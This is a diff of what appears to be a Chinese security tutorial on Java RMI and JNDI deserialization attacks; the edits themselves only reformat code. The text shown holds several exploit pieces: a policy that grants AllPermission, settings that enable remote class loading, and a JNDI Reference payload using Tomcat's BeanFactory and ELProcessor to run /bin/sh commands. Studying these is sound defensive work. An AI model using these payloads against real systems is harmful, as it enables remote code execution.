@@ -15,21 +15,19 @@
 * 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
 * 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
 ```java
-    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
-    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
-    RMISecurityManager securityManager = new RMISecurityManager();
-    System.setSecurityManager(securityManager);
-    //但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
-    System.setProperty("java.rmi.server.useCodebaseOnly","false");
+//如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
+System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
+RMISecurityManager securityManager = new RMISecurityManager();
+System.setSecurityManager(securityManager);
+//但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
+System.setProperty("java.rmi.server.useCodebaseOnly","false");
 ```
-```
+```java
 java.policy
 // Standard extensions get all permissions by default
-
 grant {
 	permission java.security.AllPermission;
 };
-
 ```
 
 ## 服务端攻击客户端
@@ -51,18 +49,18 @@ try {
         System.out.println("Using existing registry");
         reg = LocateRegistry.getRegistry();
     }
-    //绑定远程对象到Registry
+//绑定远程对象到Registry
 reg.bind("Services", services);
 ......
 ```
 和客户端攻击服务端一样，需要客户端打开安全设置，允许远程加载类。
 ```java
-    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
-    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
-    RMISecurityManager securityManager = new RMISecurityManager();
-    System.setSecurityManager(securityManager);
-    //但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
-    System.setProperty("java.rmi.server.useCodebaseOnly","false");
+//如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
+System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
+RMISecurityManager securityManager = new RMISecurityManager();
+System.setSecurityManager(securityManager);
+//但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
+System.setProperty("java.rmi.server.useCodebaseOnly","false");
 ```
 
 ## 攻击注册中心
@@ -157,7 +155,7 @@ ctx.lookup("rmi://localhost:9999/refObj");
 ## JNDI Reference攻击向量：利用本地Class作为Reference Factory
 在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。
 ```java
-  /** Payload2: Exploit with JNDI Reference with local factory Class **/
+/** Payload2: Exploit with JNDI Reference with local factory Class **/
 ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
 ref.add(new StringRefAddr("forceString", "KINGX=eval"));
 //String arg = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','/c','%s']).start()\")";
